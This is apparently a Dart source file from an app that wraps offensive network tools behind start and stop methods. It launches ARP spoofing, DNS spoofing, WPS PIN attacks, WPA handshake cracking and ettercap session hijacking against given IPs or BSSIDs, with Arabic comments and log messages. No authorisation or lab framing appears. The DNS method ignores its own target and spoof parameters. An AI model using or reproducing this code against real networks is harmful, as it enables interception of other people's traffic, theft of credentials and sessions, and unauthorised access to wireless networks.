import 'dart:io';
import 'dart:convert';
import 'package:logger/logger.dart';
import '../utils/logger.dart';

class SecurityManager {
  final Logger _logger = logger;

  Future<void> startArpSpoofing(String targetIp, String gatewayIp) async {
    try {
      // تنفيذ أمر arpspoof لبدء هجوم ARP
      final process = await Process.start('arpspoof', [
        '-i',
        'eth0',
        '-t',
        targetIp,
        gatewayIp,
      ]);

      process.stdout.transform(utf8.decoder).listen((data) {
        _logger.i('تم إرسال حزمة ARP: $data');
      });

      process.stderr.transform(utf8.decoder).listen((data) {
        _logger.e('خطأ في هجوم ARP: $data');
      });
    } catch (e, stackTrace) {
      _logger.e('خطأ في بدء هجوم ARP', error: e, stackTrace: stackTrace);
      rethrow;
    }
  }

  Future<void> stopArpSpoofing() async {
    try {
      await Process.run('pkill', ['arpspoof']);
    } catch (e, stackTrace) {
      _logger.e('خطأ في إيقاف هجوم ARP', error: e, stackTrace: stackTrace);
      rethrow;
    }
  }

  Future<void> startDnsSpoofing(String targetIp, String spoofIp) async {
    try {
      // تنفيذ أمر dnsspoof لبدء هجوم DNS
      final process = await Process.start('dnsspoof', [
        '-i',
        'eth0',
        '-f',
        'hosts',
      ]);

      process.stdout.transform(utf8.decoder).listen((data) {
        _logger.i('تم إرسال حزمة DNS: $data');
      });

      process.stderr.transform(utf8.decoder).listen((data) {
        _logger.e('خطأ في هجوم DNS: $data');
      });
    } catch (e, stackTrace) {
      _logger.e('خطأ في بدء هجوم DNS', error: e, stackTrace: stackTrace);
      rethrow;
    }
  }

  Future<void> stopDnsSpoofing() async {
    try {
      await Process.run('pkill', ['dnsspoof']);
    } catch (e, stackTrace) {
      _logger.e('خطأ في إيقاف هجوم DNS', error: e, stackTrace: stackTrace);
      rethrow;
    }
  }

  Future<void> startWpsAttack(String bssid) async {
    try {
      // تنفيذ أمر reaver لبدء هجوم WPS
      final process = await Process.start('reaver', [
        '-i',
        'wlan0',
        '-b',
        bssid,
        '-vv',
      ]);

      process.stdout.transform(utf8.decoder).listen((data) {
        _logger.i('تم إرسال حزمة WPS: $data');
      });

      process.stderr.transform(utf8.decoder).listen((data) {
        _logger.e('خطأ في هجوم WPS: $data');
      });
    } catch (e, stackTrace) {
      _logger.e('خطأ في بدء هجوم WPS', error: e, stackTrace: stackTrace);
      rethrow;
    }
  }

  Future<void> stopWpsAttack() async {
    try {
      await Process.run('pkill', ['reaver']);
    } catch (e, stackTrace) {
      _logger.e('خطأ في إيقاف هجوم WPS', error: e, stackTrace: stackTrace);
      rethrow;
    }
  }

  Future<void> startWpaCrack(String handshakeFile, String wordlist) async {
    try {
      // تنفيذ أمر aircrack-ng لكسر كلمة المرور
      final process = await Process.start('aircrack-ng', [
        handshakeFile,
        '-w',
        wordlist,
      ]);

      process.stdout.transform(utf8.decoder).listen((data) {
        _logger.i('تم محاولة كسر كلمة المرور: $data');
      });

      process.stderr.transform(utf8.decoder).listen((data) {
        _logger.e('خطأ في كسر كلمة المرور: $data');
      });
    } catch (e, stackTrace) {
      _logger.e('خطأ في بدء كسر كلمة المرور', error: e, stackTrace: stackTrace);
      rethrow;
    }
  }

  Future<void> stopWpaCrack() async {
    try {
      await Process.run('pkill', ['aircrack-ng']);
    } catch (e, stackTrace) {
      _logger.e('خطأ في إيقاف كسر كلمة المرور',
          error: e, stackTrace: stackTrace);
      rethrow;
    }
  }

  Future<void> startSessionHijack(String targetIp) async {
    try {
      // تنفيذ أمر ettercap لبدء اعتراض الجلسات
      final process = await Process.start('ettercap', [
        '-T',
        '-q',
        '-i',
        'eth0',
        '-M',
        'arp:remote',
        '/$targetIp/',
        '/',
      ]);

      process.stdout.transform(utf8.decoder).listen((data) {
        _logger.i('تم اعتراض جلسة: $data');
      });

      process.stderr.transform(utf8.decoder).listen((data) {
        _logger.e('خطأ في اعتراض الجلسات: $data');
      });
    } catch (e, stackTrace) {
      _logger.e('خطأ في بدء اعتراض الجلسات', error: e, stackTrace: stackTrace);
      rethrow;
    }
  }

  Future<void> stopSessionHijack() async {
    try {
      await Process.run('pkill', ['ettercap']);
    } catch (e, stackTrace) {
      _logger.e('خطأ في إيقاف اعتراض الجلسات',
          error: e, stackTrace: stackTrace);
      rethrow;
    }
  }
}
